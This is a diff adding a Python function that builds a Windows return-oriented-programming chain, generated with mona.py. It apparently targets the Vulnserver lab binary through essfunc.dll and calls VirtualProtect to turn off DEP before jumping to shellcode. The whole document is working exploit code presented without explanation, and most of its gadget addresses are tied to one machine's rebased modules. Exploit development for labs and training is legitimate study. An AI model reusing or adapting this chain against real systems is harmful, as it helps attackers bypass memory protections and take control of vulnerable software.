@@ -1,0 +1,36 @@
+  def create_rop_chain():
+
+    # rop chain generated with mona.py - www.corelan.be
+    rop_gadgets = [
+      #[---INFO:gadgets_to_set_esi:---]
+      0x761f30e6,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
+      0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
+      0x75bafd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_ebp:---]
+      0x758b36be,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x775f2273,  # & jmp esp [NSI.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_ebx:---]
+      0x625011b4,  # POP EAX # RETN [essfunc.dll] 
+      0xfffffdff,  # Value to negate, will become 0x00000201
+      0x76063193,  # NEG EAX # RETN [user32.dll] ** REBASED ** ASLR 
+      0x75baf9f1,  # XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_edx:---]
+      0x7605679b,  # POP EAX # RETN [user32.dll] ** REBASED ** ASLR 
+      0xffffffc0,  # Value to negate, will become 0x00000040
+      0x75b92fd0,  # NEG EAX # RETN [MSCTF.dll] ** REBASED ** ASLR 
+      0x75611110,  # XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR 
+      #[---INFO:gadgets_to_set_ecx:---]
+      0x775b360d,  # POP ECX # RETN [WS2_32.DLL] ** REBASED ** ASLR 
+      0x76efd238,  # &Writable location [USP10.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_edi:---]
+      0x758a9f08,  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x761c1645,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
+      #[---INFO:gadgets_to_set_eax:---]
+      0x7592f6b8,  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
+      0x90909090,  # nop
+      #[---INFO:pushad:---]
+      0x75ae07f0,  # PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR 
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+
+  rop_chain = create_rop_chain()
